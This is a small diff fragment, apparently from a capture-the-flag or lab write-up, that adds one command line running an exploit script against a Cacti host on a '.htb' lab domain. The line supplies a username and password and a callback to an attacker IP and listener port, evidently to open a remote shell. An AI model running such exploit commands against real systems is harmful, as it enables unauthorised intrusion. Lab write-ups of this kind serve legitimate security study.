@@ -1,5 +1,5 @@
 ```
-
+python3 exploit.py -u marcus -p wonderful1 -i 10.10.17.59 -l 4444 -url http://cacti.monitorsfour.htb/
 ```
 
 ```
